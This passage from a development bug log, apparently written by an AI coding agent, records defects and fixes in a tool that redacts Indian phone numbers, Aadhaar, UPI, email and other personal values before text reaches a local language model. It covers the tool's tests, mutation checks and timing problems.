spaced mobile after a lone digit and a space is found, keyword or
not"); `spaced-mobile.test.ts` has the case without a keyword.

**Lesson:** the no-leak test's sentences never put a digit right before a
value, so a whole class of layouts had never been tried. 5c should add a
"digit before" and "digit after" variant to its sentences.

## 33. An IPv6 address outside the documentation range typed into a test comment (2026-10-01, Phase 5b IP)

**Symptom:** the final full run after the IP mutation tests were added:
`repo-hygiene` failed, "contains no IP address outside the ranges nobody
can be found at", pointing at `test/unit/detection/ip.test.ts:194`.

**Root cause:** the comment I wrote above the new I4 test explained what
the mutant would read, and wrote that out in quotes: the hex tail of the
word "source", a colon and a documentation address. On its own, in
quotes, that string is a valid IPv6 address whose first group is not
`2001:db8`, so to the hygiene rule it is a typed public address. The test
row itself uses only the documentation prefix; the comment was the only
place the other address appeared. Same mistake as bug 26 (a value typed
into a test file), in a comment this time.

**Fix:** the comment says "never with the `ce` in front (that is a valid
address)" instead of writing the address. Hygiene and IP tests pass (157).

**Guarded by:** `repo-hygiene.test.ts`, which is what caught it.

**Lesson:** an explanation of a mutant's reading is itself the value the
mutant would read; describe it, don't write it.

## 34. A spaced mobile next to another digit group is not detected, keyword or not (2026-10-01, found in Phase 5c measurements, fixed in Phase 5c item 1)

**Symptom:** while measuring item 3 of the 5c proposal (widening merging
neighbours) on synthetic pairs, two mobiles written 5 + 5 and separated
only by a space (`<mobile> <mobile>`) gave no detection at all: 0 of 400
values redacted, with or without "Call" in front. The same happened to a
spaced mobile followed by a 5-digit group (200 of 200 missed), three
spaced mobiles in a row (600 of 600), two separated by two spaces, and a
spaced mobile followed by a token such as `24x7` (198 of 200 missed; 200
of 200 with `+91` in front). Two spaced mobiles joined by a hyphen were
partly sent (134 of 400 values). Bug 32 (a lone digit and a space before
the mobile) is one case of this. Not affected: unbroken mobiles, a small
number after the mobile (`<mobile> 9 baje…`, `… 2 hours ago`), and
mobiles separated by `, `, `/` or `or`. The detectors as committed
behave the same; nothing in 5c caused it.

**Root cause:** the same as bug 32, wider than recorded there.
libphonenumber takes the whole stretch of digit groups joined by spaces
as one candidate; when that stretch is not a valid number it reports
nothing, and does not look for the 10-digit number inside it. The
POSSIBLE pass fails the same way, so a keyword does not help. The
Aadhaar and card detectors try every window of a digit run; the phone
detector does not. The safety net does not join across spaces (ADR-011).
With a hyphen, the net catches the 10 digits around the hyphen, and the
outer five digits of each mobile are sent.

**Fix:** ADR-027. `src/detection/spaced-mobile.ts` looks inside the
run: two neighbouring 5-digit groups inside a longer run that make a
valid Indian number starting 6–9 are a phone candidate, validated unless
another line has two 5-digit groups in the same two positions that are
not such a mobile (a table of numbers), in which case a keyword is
needed. The first rule approved (PH8) was implemented and replaced
before commit: bug 37.

**Guarded by:** `spaced-mobile.test.ts` (every shape above, tables,
line breaks, misaligned sheets, known costs and limits, four fail-fast
timing tests); the no-leak test now plants a digit, a 5-digit group or
`24x7` beside values of every type, pairs of numbers side by side, and
the bare spaced form of a mobile (S1, the detector switched off, fails
both no-leak blocks); the shape block's `digit-beside`,
`side-by-side`, `contact-sheet` and `misaligned-sheet` rows.

**Lesson:** bug 32 was recorded from its first example (a digit before
the mobile) and the general shape was not probed; one more minute of
probing would have found that any neighbouring digit group does it.

## 35. Two values side by side: the second (or first) is sent when they share a digit run or a hyphen (2026-10-01, found in Phase 5c item 1; fixed in items 2 and 3)

**Symptom:** the no-leak test, given "two values side by side" sentences
for the bug-34 fix, failed on types that are not phones (`EMAIL raw` 3,
`SECRET raw` 1; streaming block `IFSC raw`, `EMAIL raw`, `UPI raw` 1
each). A probe of every pair of the ten planted types, four separators
(`" "`, `" - "`, `". "`, `"-"`), 200 pairs each, counted every value with
a letter or digit outside all detections. Worst rows: after a hyphen, an
email is sent whole after any other value (200 of 200; after a bare
number 26 of 200), a UPI ID after another UPI ID (200 of 200), a JWT
after any value (15 to 30 of 200, about all the JWTs drawn). With a
space or other separator: an IFSC followed by an IPv6 address (80 to 89
of 200, the IFSC lost), an IFSC next to a `<mobile>@<handle>` UPI ID (33
to 50), two IP addresses (9 to 34), an IP or secret next to a UPI ID or
IP (3 to 78). Identical with the detectors as committed: nothing in 5c
caused it.

**Root cause:** two, both known open issues. (1) Widening (ADR-010): a
value that ends or starts with digits shares a digit run with its
neighbour (`<IFSC> 2001:…`, `<IFSC> <mobile>@ybl`), `widenToRuns`
stretches one detection over the other's digits, and the second overlap
pass keeps only one of the two. This is Phase 5c item 2 ("widen only up
to the neighbouring detection"). (2) After a hyphen, an email's local
part or a UPI name may contain `-` and digits, so the second value's
pattern starts inside the first value; the overlap with the validated
first value drops it (the ADR-003 containing-span question, item 3). A
JWT's alphabet contains `-`, so a JWT after `-` is glued and never
starts.

**Fix:** in two parts. **Item 2 (ADR-028):** widening stops at the
neighbouring detection; the pair probe went from 69 leaking rows to 37.
**Item 3 (ADR-029):** the rest. Measured cause by cause on prototypes: an
email or UPI ID glued by a hyphen is a second, overlapping reading that a
left-to-right search never returns (fixed by finding them at every `@`);
a reading that overlaps the winner without containing it was dropped
whole (now it keeps what no winner covers); a JWT could not start after
`-` (now it can, found by a linear scan); a key whose alphabet has `-` ran
into the next key's prefix (a key now takes the rest of its token); a
16-digit card window across a number and an IPv6 address's first group won
the overlap (its loser's remainder now stays covered). Rows with a leak:
29 at the start of item 3 → 0, on a probe of every type × every type × 4
separators × 200 pairs.

**Guarded by:** `detect.test.ts` ("any two values side by side are both
covered": every type pair × " ", " - ", ". ", "-", 6 values each; and the
ten item-2 pairs, each value in its own detection); the no-leak test now
plants pairs of any two planted types with all four separators, with no
exception (the user's requirement); unit tests for each rule
(`resolve.test.ts`, email/UPI glued values, secrets glued to text, joined
digits); mutations D1, R2, R9, J1, S1 and S3 also run the no-leak test.

**Lesson:** the "two values side by side" shape was only ever measured
for numbers. Planting every type next to every other type, once, found
seven distinct failures in a minute.

## 36. A spaced mobile after a token ending in a digit and "x" is not detected (2026-10-01, found in Phase 5c item 1, fixed before item 3)

**Symptom:** while finding the cause of the leaks in bug 35, "PAN then
phone" missed the mobile in 8 of 200 pairs, and "secret then phone" in 4.
Every PAN ending in X misses the mobile after it (200 of 200 with the
letter set to X; 0 for the other 25 letters), as does `Room1X <mobile>`;
of 20,000 secrets, the 102 ending in a digit and `x`/`X` all miss it, and
6 others do (each ends with a digit and one or two letters; cause not
established). Unspaced mobiles are not affected. Identical at HEAD.

**Root cause:** libphonenumber reads an `x` right after a digit as the
start of an extension (`1234x…`) and then reports nothing for the stretch
that follows. `hideExtensionMarkers` blanks only an `x` that stands
alone, by design, so a letter of a word is never blanked. The new
spaced-mobile detector does not help: the mobile is a whole digit run on
its own, and whole runs are left to libphonenumber.

**Wider than first recorded** (measured before the fix, 200 per cell):
every spaced phone format is missed after a digit followed by `x`, `xt`,
`ext` or `x-` (5 + 5 and 3-3-4 mobiles, 4-3-3, landlines such as
`022 …`), not only 5 + 5 mobiles; unbroken numbers, `+91-…`, `0…` are
not. Endings such as `3x_`, `77xyz`, `1234T`, `8#` are not affected.
The 6 unexplained secrets were this: they ended in `<digit>Xt` or
`<digit>x-`.

**Fix:** the bug-7 approach. `hideExtensionMarkers` also blanks an
extension word right after a digit in libphonenumber's copy of the text
(the digit was dropped from the marker's lookbehind); the lookahead is
unchanged, so a marker followed by a letter or digit (`24x7`,
`6789x123`) is left alone. The alternative, letting `spaced-mobile.ts`
take whole 5 + 5 runs, was measured too: it fixes only the 5 + 5 mobile
format (3-3-4, 4-3-3 and landlines still missed). Neither changed anything
else measured (generated set, shape rows, 9 amount-table layouts, 12 kinds
of plain text, multi-line messages).

**Guarded by:** `phone.test.ts` ("hides standalone extension markers and
ones right after a digit", "finds a spaced number after a word ending in a
digit and "x"": six endings × three formats) and `spaced-mobile.test.ts`
(the old known-limit test, flipped). 3 of 3 mutations caught (the old
lookbehind; a marker followed by a digit blanked; a marker after a letter
blanked).

## 37. The approved bug-34 fix (PH8) does nothing in a message with a second line of numbers (2026-10-01, found and fixed in Phase 5c item 1)

**Symptom:** after PH8 was implemented (and matched the prototype on
every probe set and on 50,000 fuzzed texts), the streaming no-leak block
still sent 3 spaced mobiles that had a digit or a second number beside
them. All three were in messages where another line also held two or
more groups of 3+ digits. A probe of such messages ("Hi team", one line
with a spaced mobile and a neighbour, 1 to 3 ordinary lines such as
`Order <5 digits> placed on 2026-09-<dd>`, `Flat <n>, Tower <n>, Pune
<PIN>`, `Paid Rs <Indian amount> on <dd>/09/2026`, or an Aadhaar line;
no keyword) gave 0 of 1,500 mobiles redacted, as before the fix.

**Root cause:** PH8's table guard counts any line with 2+ groups of 3+
digits as a table row, and in a table of 2+ rows a pair needs the same
two columns to be a mobile on every row. Ordinary text has such lines
often (a date with a 4-digit year, an order number, a PIN code, the
`000` group of an Indian amount), so a single mobile line and one
unrelated line already make a "table". The previous session's probe sets
were single lines or real tables, so the measurement missed it.

**Fix:** three alternatives were measured on the same probe sets plus
this one (R1, a row's peers are rows with the same number of groups:
528 of 1,500; R2, the same and 5-digit groups at the pair's positions;
R3, a line counts against a pair only if it has 5-digit groups at the
pair's two positions, whatever else it holds: both 1,500 of 1,500, R3
cheaper on tables). The user chose R3 (ADR-027). Never committed.

**Guarded by:** `spaced-mobile.test.ts` ("ordinary lines of numbers
around it do not make a table", "only lines with 5-digit groups at the
same two positions count against a pair"). Mutation S11 (any two groups
on a line, not two 5-digit groups, count against a pair, much like PH8)
fails the first and the streaming no-leak block; S12 (any table column
in the message counts against every pair) fails the second and 12 other
tests, but not the no-leak test. The no-leak test's "Details below"
sentences put a value on its own line among others.

**Lesson:** a guard measured only on the inputs it was designed for
(tables) must also be measured on the inputs it can misfire on (ordinary
multi-line text), with the same weight.

## 38. The mutation runner reported "0 of 0 failed" when its output folder did not exist (2026-10-01, Phase 5c item 1)

**Symptom:** the first mutation run of 5c item 1 printed
`S1: 0 of 0 failed in 5s | the detector is not called` and then crashed
writing `results.log`. The file was put back and the marker removed, as
designed. "0 of 0 failed" reads as a mutation no test caught; had the
crash come later, or the log line been the only output read, a
mutation would have been recorded as surviving when nothing was
measured. S1 is caught by 20 tests.

**Root cause:** `scripts/mutate.ts` passes the test reporter a progress
file inside `--out` and never created that folder. The reporter could
not write, so no test was reported, and the runner turned "no lines"
into "0 of 0 failed". The folder had always existed in earlier sessions.

**Fix:** the runner creates `--out` before anything else, and a run in
which no test reported at all is logged as `NO RESULT: no test reported
anything`, never as a count.

**Guarded by:** checked by hand (`mutate.ts` is wiring and has no unit
test): a real mutation into a missing folder was reported as "1 of 21
failed" with its results written there, and one whose test path matched
no file as `NO RESULT`. Both left the file restored and no marker.

**Lesson:** a tool that reports results must treat "nothing reported" as
its own outcome; a count of zero is a claim.

## 39. Two UPI IDs at known handles typed into a code comment (2026-10-01, Phase 5c item 3)

**Symptom:** the full suite's repo-hygiene test failed on `upi.ts` line 15
right after the anchored UPI detector went in: the new module comment
gave a glued example written with two real handles.

**Root cause:** mine: the example was typed with real handle names
instead of placeholders. The project forbids typed UPI IDs at known
handles in any file (ADR-024), for the same reason as card and Aadhaar
numbers. Same slip as bug 33.

**Fix:** the comment says `<name>@<handle>-<name>@<handle>`. The tests
that need such an ID build it at run time from `UPI_HANDLES`.

**Guarded by:** `repo-hygiene.test.ts`, which caught it.

**Lesson:** an example in a comment is a value in a file; placeholders
from the start.

## 40. A wrapped value with another number on one of its lines is never found (2026-10-02, found and fixed in Phase 5c item 4)

**Symptom:** with the approved line-break rule built (two whole digit
runs across one line break) and every unit test green, I added wrapped
Aadhaar, card and phone forms to the no-leak test. Both blocks failed:
3 and 12 values sent as written (Aadhaar, card, one phone). A probe of
each neighbour the test plants (300 values per shape, counts only):
with a digit before the value, a digit, a 5-digit group or `24x7` after
it, or a second value joined by a space, `-`, `. ` or `-`, 300 of 300
wrapped Aadhaar and card numbers were missed, and wrapped phones with a
group or `24x7` after them.

**Root cause:** the rule joined two _whole_ runs. The digit beside a
value is part of the same run (`3 2345 6789` is one run), so the joined
window had 13 digits, not 12, and no window inside it was tried. The
same thing ADR-027 fixed on one line (bug 34). The prototype measurement
(5c proposal) and my unit tests put every wrapped value alone in its
sentence.

**Fix:** windows across the break take the last groups of one line's run
and the first groups of the next line's, with at least one run whole,
and a window that is only part of a run must use one of the type's usual
layouts (option P3, chosen by the user from P, P2 and P3; ADR-030).
Every neighbour shape is then found except an unspaced 6 / 6 Aadhaar
beside another number (a known gap; the no-leak test does not plant that
one form, and a test pins it). Never committed.

**Guarded by:** `line-break.test.ts` ("a wrapped value with a number
beside it": 6 neighbours × Aadhaar, card, phone) and the no-leak test's
wrapped forms. Mutation G7 (whole runs only, the rule before this fix)
fails 21 tests, both no-leak blocks among them.

**Lesson:** the neighbours bug 34 taught me about apply to every new way
of joining digits; a new joining rule gets the no-leak test's neighbours
from its first test, not after.

## 41. A number on the line before a mobile was redacted with it (2026-10-02, found and fixed in Phase 5c item 4)

**Symptom:** mutation P5 (a phone found anywhere inside a wrapped window
counts, not only one matching the whole window) survived, so I wrote the
test I expected it to fail: `Flat 12`, newline, a spaced mobile, with
"mobile" in the sentence, should give one PHONE over the mobile only. The
test failed on the real code: the PHONE ran from `12` to the end of the
mobile.

**Root cause:** libphonenumber accepts `12 <mobile>` as a _possible_
number as a whole, so the window of `12` and the mobile's line was a
wrapped phone candidate. It wholly contains the validated one-line
mobile, so the containing-span rule (ADR-029 C3) let it replace the
mobile. Nothing was sent, but the flat number and the line break were
taken from the model, in a common layout (an address line, then a
number).

**Fix:** a wrapped phone window that holds a whole _valid_ phone found
within a line is skipped, unless it starts with `+` (`phone.ts`, binary
search over the one-line candidates). It took three tries, each caught by
re-running the item-4 measurement: skipping on _any_ one-line phone cost
4 wrapped phones in the probe (2 → 6 partly; `98765 432` alone is a
possible number, and the window over it and the next line is the real
mobile); valid ones only still left 3 `+1`, newline, `<number>` values
with the country code outside the placeholder. With both refinements
every item-4 number equals the measurement before the fix. Never
committed.

**Guarded by:** `line-break.test.ts` ("does not take a number on the line
before a whole mobile", "is one phone when broken inside its second
group", "takes a country code on the line before a whole number with
it"). Mutations H1 to H4 (no check; any touching phone stops a window;
unvalidated ones count; `+` windows checked too) are all caught, H3 after
the second test was added. P5 still survives: on 100,000 fuzzed two-line
texts with a phone keyword it differs from the final code in 2,918, only
in grouping or by covering more digits (703), never fewer.

**Lesson:** a mutant that survives is a question about behaviour, not
only about tests: writing the test it should fail found a real defect.

## 42. A date of birth with two spaces around its month name was sent as written (2026-10-02, found and fixed in Phase 5c item 5)

**Symptom:** a new `redact.test.ts` test for the DOB value key (the same
date in two spacings and cases should share one placeholder) failed:
`born 7  MARCH 1991` (two spaces after the day) came out unredacted,
with "born" right in front of it.

**Root cause:** the date detector (`dob.ts`, written this session)
allowed at most one space or hyphen between a month name and its
numbers, while the value key I wrote for it collapses runs of spaces:
the two halves disagreed about what a date can look like, and the
detector's half was the narrower one. A double space is common in typed
and pasted text, so a date of birth next to its keyword was sent.

**Fix:** between a month name and a number, any number of spaces or one
hyphen (`GAP` in `dob.ts`), in both month-name forms. Numeric dates keep
one separator character throughout (`07 / 03 / 1991` stays a known gap,
ADR-031). Never committed.

**Guarded by:** `dob.test.ts` (the forms `7  March  1991` and
`March  7,  1991`; a timing input of digits before long runs of
spaces) and the `redact.test.ts` value-key test that found it.

**Lesson:** a normalising value key is a statement about what the
detector can produce; test the two together, not each on its own.

## 43. A property of mine demanded a DOB where a valid phone rightly won (2026-10-02, found and fixed in Phase 5c item 5)

**Symptom:** the final full run failed one test: "every digit of a date
of birth stays covered with another value after …" (a fast-check
property; seeds are random per run). Replayed by seed and path in a
scratch script that printed only shapes and offsets: a date written
`d.d.dddd`, a hyphen, then a 4-digit number; one PHONE detection,
validated, over all of it; no DOB detection.

**Root cause:** the test, not the detector. The ten digits of
`<d>.<d>.<dddd>-<dddd>` happened to make a valid Indian mobile, and a
validated reading beats an unvalidated one (ADR-003 rule 1; every DOB
is unvalidated). Every digit was covered and nothing was sent. The
property also required a detection of type DOB, which is stronger than
what it was written to prove, and false for about 1 run in a few
hundred.

**Fix:** the property checks coverage only, as its name says; a comment
explains the phone reading. 20,000 runs of it in a scratch script: no
failure. The candidate-level test of the hyphen rule still pins that a
date is found there. Never committed.

**Guarded by:** the corrected property in `dob.test.ts`.

**Lesson:** a property asserts the promise (nothing visible), not the
reading I expected; the type is the overlap rules' business and has its
own tests.

## 44. The digit table matched one Unicode version, and the .nvmrc Node had another (2026-10-02, found and fixed before Phase 5d)

**Symptom:** after the user upgraded to Node 22.23.3 (the version in
`.nvmrc`), `npm test` failed 2 of 2,532 tests:
`decimal-digit-zeros.test.ts` "covers every decimal digit this Node
knows about" (expected 760 to be 770) and the `normalise.test.ts` oracle
property (seed 1873429992, path "17:5").

**Root cause:** the table was generated on Node 22.17.1 (Unicode 16.0,
ICU 77.1), a version below `engines` (`>=22.20.0`), and Node 22.23.3 has
Unicode 17.0 (ICU 78.3), which added one block of decimal digits: Tolong
Siki, U+11DE0–U+11DE9 (Kurukh). Two things were wrong. (1) On the
`.nvmrc` Node, those ten digits were not mapped, and the number
detectors read only ASCII `[0-9]` after normalisation, so a number
written in them reached the detectors as non-digits and was sent as
written. (2) The test demanded an exact match with whichever Node ran
it, so no table could pass on every Node `engines` allows (Node 22.22.1
moved to ICU 78; older 22.x and the installed 22.17.1 have Unicode 16.0).
On an older Node its message, "run `npm run gen:digits`", would have
regenerated a smaller table and brought (1) back for everyone on a newer
Node.

**Fix:** table regenerated on 22.23.3 (77 blocks, 770 digits); it now
exports `DECIMAL_DIGIT_UNICODE`. The generator refuses to run on a Node
whose Unicode is older than the table's (tried on 22.17.1: refused, file
unchanged). The tests now: every block is ten digits this Node knows, or
ten code points this Node has not assigned at all (a newer table on an
older Node maps more, which fails closed); every digit this Node knows is
covered; an exact match is required on a Node with the table's Unicode;
and on the `.nvmrc` Node, which CI runs, the table must be from its
Unicode. The normalise oracle counts unassigned blocks from the table as
digits (only on an older Node; there are none on 22.23.3). Both test
files pass on 22.23.3 (55 of 55) and on 22.17.1 (53, the 2 exact checks
skipped). 4 of 4 mutations caught (Tolong Siki dropped, version label
wrong, an assigned non-digit block added, an unassigned block added).

**Guarded by:** `decimal-digit-zeros.test.ts` (the four rules above),
`normalise.test.ts` ("turns Tolong Siki (Kurukh) digits into ASCII").

**Lesson:** a generated table belongs to the runtime it was generated
on; that runtime has to be the one the project pins, and a check that
compares against "whatever Node runs" needs a rule for older and newer
Nodes, not just equality.

## 45. A new property over the recorded stream timed out in the full coverage run (2026-10-02, found and fixed in Phase 5d part 1)

**Symptom:** the first full coverage run after adding
`ollama-recorded-stream.test.ts` failed one test: "is parsed the same
however the bytes are cut", 31.9 s against the 30 s limit (the file took
38.0 s). Alone, plain, it had taken 2.0 s, and alone under coverage 3.65 s.

**Root cause:** my test, sized by habit. Each of its 200 runs parses the
whole 516,575-byte recording, about 100 MB of parsing, and in the full
coverage run, with every other file running in parallel, it ran about 9
times slower than alone. The working rule from bugs 28 and 30 (time one
run of a new input before choosing its size) was followed only for a
plain run on its own, not for the full coverage run.

**Fix:** 20 runs (0.36 s alone under coverage). Nothing is lost: the
byte-at-a-time test already covers every single cut position; the
property adds random multi-cut layouts. Never committed.

**Guarded by:** the 30 s `testTimeout`, which is how it was found.

**Lesson:** a heavy test's cost has to be judged in the full coverage
run, where load multiplies it (here about 9×), not alone. The same
slowdown is part 2's subject (timing tests under load).

## 46. Growth-ratio tests failed and timed out whenever the machine was busy (2026-10-02, fixed in Phase 5d part 2)

**Symptom:** for weeks, linear code failed growth-ratio tests (ratios 8.0
to 8.6 against a limit of 8; dob "slashed digits" 8.34 and unsafe-regions
"prose" 8.05 on 2026-10-02), timing tests ran past the 30 s limit (IFSC
31.4 s, stream-restore 38.7 s, recorded as unexplained), and dozens failed
at once during slow spells. Bug-log 20 and 21 had treated the symptoms
(re-measuring, longer hook timeouts).

**Root cause:** measured (ADR-032 table): load. With 11 workers on 12
logical CPUs, a 2 ms run on the small input often finishes inside one time
slice while a 10–40 ms run on the large input is interrupted every time,
and keeping the fastest of five runs cancels load for the small input
only. In the inflated readings the large input slowed 8.3× and the small
2.7× (15.9× and 3.9× overloaded). The timeouts are the same load acting on
inputs sized for a quiet machine (one call took 42.8 s in a plain full
run). Core type is not a cause.

**Fix:** the timing tests run in their own Vitest project after the rest,
at most three files at a time (ADR-032), and a failure now prints its
sizes and run times. Measured that way beforehand: 267 calls, max ratio
6.22, longest call 9.9 s.

**Guarded by:** the project split in `vitest.config.ts`; the stability
runs in the testing guide; `linear-time.test.ts` for the failure message.

**Lesson:** a timing test measures the machine as much as the code; it
needs a machine with CPU to spare, and the fastest of several runs only
cancels noise that each run has a fair chance of escaping.

## 47. A 300 ms deadline failed under load, and the consumer-time test did not test its claim (2026-10-02, found and fixed in Phase 5d part 2)

**Symptom:** stability run 1 of 10 after the ADR-032 split failed one
main-project test: `ollama.test.ts` "time the consumer takes between reads
does not count against the timeout", with "provider timeout" thrown while
opening the stream. The speed probe peaked at 709 ms in that run (about
40 ms typical).

**Root cause:** two things. (1) The test needed the mock's first chunk
within a 300 ms timeout; during a slow spell a local round trip took
longer. Four more tests had the same shape, a success that must arrive
before a short deadline: "keeps going while every gap is shorter" (500 ms),
"a gap longer than the timeout" in the adapter (300 ms), the canary (400 ms)
and the endpoint (400 ms). Tests that only wait for a timeout to fire are
safe: load makes those fire sooner. (2) While fixing it, mutation T1 (a
wait never clears its timer, so the clock keeps running after each read)
was caught by "keeps going" but not by this test: the mock sent the whole
stream at once, so when the stale timer fired nothing was left to cut off
and every later read came from the buffer. The test passed without
testing its claim.

**Fix:** `SUCCESS_DEADLINE_MS` = 2,000 in `test/support/mock-provider.ts`
(explained there) for the five tests; "keeps going" now sends 31 writes
100 ms apart (about 3 s, gaps a twentieth of the timeout). The
consumer-time test sends the first event, holds the rest until 1.25
timeouts, and pauses the consumer once for 1.5 timeouts: correct code has
no read pending during the pause, while a clock that kept running fires
with the stream still open. T1 now fails both tests (2 of 73).

**Guarded by:** the five tests; mutation T1 in the testing guide.

**Lesson:** a test with a deadline must say which way load pushes it, and
a test about a stream that is still open must keep it open.

## 48. The ADR-032 split left two real-clock tests in the main project (2026-10-02, found and fixed in Phase 5d part 2)

**Symptom:** stability round 2, run 2: `linear-time.test.ts` "still fails
real quadratic work" failed, expected 6.36 to be at least 8 (probe median
41 ms, max 225 ms in that run: an ordinary full run).

**Root cause:** mine. I moved every file that called `growthRatio` on real
work, but treated the helper's own test file as scripted-clock only; two
of its tests time real quadratic work. And the helper's comment ("load can
only push a ratio up") is wrong for a check that expects a high ratio: if
load slows all three small-input runs while one large-input run escapes,
the ratio falls.

**Fix:** both tests moved, names unchanged, to
`test/unit/support/linear-time.timing.test.ts` (16 timing files, 89
tests); the comment in `linear-time.ts` corrected. Never committed.

**Guarded by:** the timing project; round 3 of the stability runs.

**Lesson:** "uses `growthRatio`" was the wrong test for "times real work";
the right one is "restores the real clock or never mocks it".

## 49. An email inside a URL takes the URL's host and path with it (2026-10-02, found in Phase 5d part 3, fixed before part 4)

**Symptom:** the first echo measurement on the new `in-markup` shape held
21 placeholders by the URL rule where 27 were expected. All six missing
ones were emails in a plain URL's query or path
(`https://support.example/track?id=<email>`,
`https://portal.example/users/<email>/orders`): the redacted text read
`https:[EMAIL_1]`, which no rule sees as a URL, so an echo restored it.
Measured with a script that printed types, offsets and booleans only: 19
of the 40 `in-markup` emails start before the address (by 27 characters
in the query placement, exactly `//support.example/track?id=`), every one
after `?key=` or `/` in a URL; all 153 main-set and 30 `contained` emails
are detected exactly.

**Root cause:** `email.ts` reads the local part leftwards over every RFC
5322 local-part character, and `/`, `=` and `?` are among them, so it runs
back to the `//` after the scheme. Not a leak: more is redacted, never
less. But the model loses the URL's host and path, the URL rule cannot
see a URL in what is left, and the eval's precision does not show it (a
detection that touches a personal value of its own type counts as right,
however far it reaches).

**Fix (ADR-034, the user's choice of option 2):** the local part stops at
`/`, `=` and `?`. Measured on a copy before the change: 0 of 223
labelled emails lost (153 main, 70 shape block), all 223 now detected
exactly; no score count in either part moved; the `in-markup` echo went
from 32 restored / 21 left by the URL rule to 26 / 27; 200,000 fuzzed texts:
246 detections changed, every one in a text with one of the three
characters, and every one covering less, never more. That is the cost,
accepted on purpose: an address using one of them is redacted only from
the character after it.

**Guarded by:** `email.test.ts` ("takes the address alone in …", and the
pinned cost "sends what is before …"); mutations L1–L3; the `in-markup`
echo thresholds.

## 50. The echo's "first form" check never looked at what restoration produced (2026-10-02, found and fixed in Phase 5d part 3)

**Symptom:** `echo.test.ts` "when the message does not come back" (a
restorer that returns the redacted text when the safety rules are off)
expected 1 broken message and got 0: the message was counted as "back
with a later mention as first written".

**Root cause:** mine. When the rules-off restoration differed from the
original, the check asked only whether the original fits the redacted
text with first mentions replaced by their values and later ones free.
That is a statement about the redaction and the mapping; nothing in it
read the restored text, so any restoration bug that made a message
differ would have been reported as the by-design "first form" case.

**Fix:** a message counts as "first form" only if the restored text is
exactly the redacted text with every placeholder replaced by its value
(`filled`) and the original fits with later mentions free. Two more tests:
a restoration that lowercases everything (2 messages broken, where the old
check passed both) and a redactor that drops text (E4). Never committed.

**Guarded by:** `echo.test.ts`, "a restorer that is wrong is caught";
mutations E3 and E4.

## 51. The rewrite classifier counted one invented placeholder twice (2026-10-02, found and fixed in Phase 5d part 4)

**Symptom:** `rewrites.test.ts` "invented: placeholder shapes the mapping
does not hold" expected 5 inventions and got 6. The first model run was
already going.

**Root cause:** mine. `classifyAnswer` matched the bracketed shape and
restoration's bare shapes separately, so `[EMAIL_2]` (not in the mapping)
was found as `[EMAIL_2]` and again as the bare `EMAIL_2` inside it.
`restore.ts` drops a bare match inside a bracket (bug-log 17's merge);
the classifier had not copied that rule. The invented count is half of
ADR-017's decision rule, so the double count could have turned the
instruction off on its own.

**Fix:** bare shapes inside a bracketed match are skipped. The running
measurement (6 of 30 calls done, none of its numbers used) was stopped
and run again from the start with the fixed classifier: temperature 0 and
a fixed seed, so the calls are the same; not a retry of a failed call.

**Guarded by:** `rewrites.test.ts`, "a bare form inside a bracketed one is
not a second invention".

## 52. The README published 54 UPI handles for a list of 51 (2026-10-02, found and fixed in Phase 5d part 6)

**Symptom:** re-checking every README number against its source before
calling Phase 5 done, `UPI_HANDLES.size` was 51; the README's data-type
table, ADR-024 and the project status all said 54.

**Root cause:** mine, on 2026-10-01: the number was written by hand from
the groups in the list's comments, not read from the code, and nothing
compared the two. Git shows 51 entries in both versions of `upi.ts`, so the
published number was wrong from the first commit of the UPI detector. No
behaviour was affected; a public claim was.

**Fix:** 51 in the README, ADR-024 (with a correction note) and the
status. `test/unit/readme-facts.test.ts` now reads the README's numbers
that come from the code or a stored result (UPI handles, IFSC bank codes,
the stream hold-back, the size limits, the placeholder-instruction
default, the model-measurement table) and compares each with its source.

**Guarded by:** `readme-facts.test.ts`.

## 53. The names stopping rule had a case that fitted none of its steps (2026-10-03, found and fixed in Phase 6a, before any model run)

**Symptom:** a mutation check of `eval/names/rule.ts` survived every rule
test: R10, which let the "too costly" step choose from candidates that are
within the limits as well. Working out why no test could tell the
difference showed the case the mutant changes was missing from ADR-035
itself.

**Root cause:** mine, in the rule as first written into ADR-035 the same
day. Step 2 combined only the chosen candidate (the eligible one with the
highest R) with F. If that candidate stayed below 60% while another
candidate's combination with F was within the limits and reached 60%, step
5 needed "no eligible candidate or combination reaches 60%" (false) and
step 6 needed "R below 60% everywhere" (false): no step applied. The code
fell through to "not shipped", although a configuration within every limit
reached the floor.

**Fix:** step 2 of ADR-035 amended before any model run (dated, with the
reason): below 60%, the eligible combination of any other candidate with F
that has the highest R and reaches 60% takes the chosen one's place, and
is judged like any choice. `decide` gained that step; the fallback step
no longer filters for candidates over a limit, since at that point nothing
within the limits reaches 60%.

**Guarded by:** `test/unit/eval/names/rule.test.ts`: "below 60%, another
candidate's combination with F within the limits takes its place" and
"takes 60% itself as reached, at every step"; mutations R10, R14 and R15
are caught by them.

## 54. The comparison script refused every output folder on another drive (2026-10-03, found and fixed in Phase 6a, in the pre-flight)

**Symptom:** the first pre-flight of `scripts/compare-names.ts`
(`--smoke --out D:/pseudonym-6a/runs/smoke`) stopped with "--out must be
outside the repo", although D: is not the repo's drive.

**Root cause:** mine. The guard took "outside the repo" to mean that
`path.relative(repo, out)` starts with `..`. Between two Windows drives
`relative()` cannot climb out, so it returns the absolute target path
(`D:\pseudonym-6a\...`), which does not start with `..`, and the guard read
it as inside. The script had never been run before the pre-flight (no
model runs until the user's go), and the wiring is not under test.

**Fix:** outside = the relative path starts with `..` or is absolute.
Checked by hand both ways: `--out .` and `--out eval/x` are refused (no
folder created), `--out D:/…` is accepted.

**Guarded by:** nothing automatic: `scripts/compare-names.ts` is wiring
and, like `eval/run.ts`, not covered. The pre-flight (`--smoke`), added for
this run, is what found it.

## 55. E's speed check sent Ollama more than its context, and Ollama refused it (2026-10-03, found in the Phase 6a run; not fixed, waiting for the user)

**Symptom:** the overnight 6a run (started 01:40 IST) stopped itself at
01:49:59, as designed, with `STOPPED: E:generated failed (exit code 1)`;
the child's last line was `Ollama answered HTTP 400`. A, B, D and F had
finished and their results were saved. E produced nothing. Nothing was
retried.

**Root cause:** mine. E's speed check sends the first 16 KiB of generated
text as one request. Ollama's server log: `request (7725 tokens) exceeds
the available context size (4096 tokens), try increasing it`, answered 400. ADR-035's "built" note assumed Ollama would truncate a long prompt
and only E's speed number would be a lower bound; Ollama 0.35.1 (it was
0.35.0 in Phase 5) refuses instead. The pre-flight (`--smoke`) used one
short sentence, so it could not show this.

**Fix:** none yet; the user decides. Options: (1) treat a refusal for
length on the speed text like the time budget, as over the limit, so E
runs on the names block only, which ADR-035 already expects for E;
(2) raise E's context (`num_ctx`), which changes E's configuration and
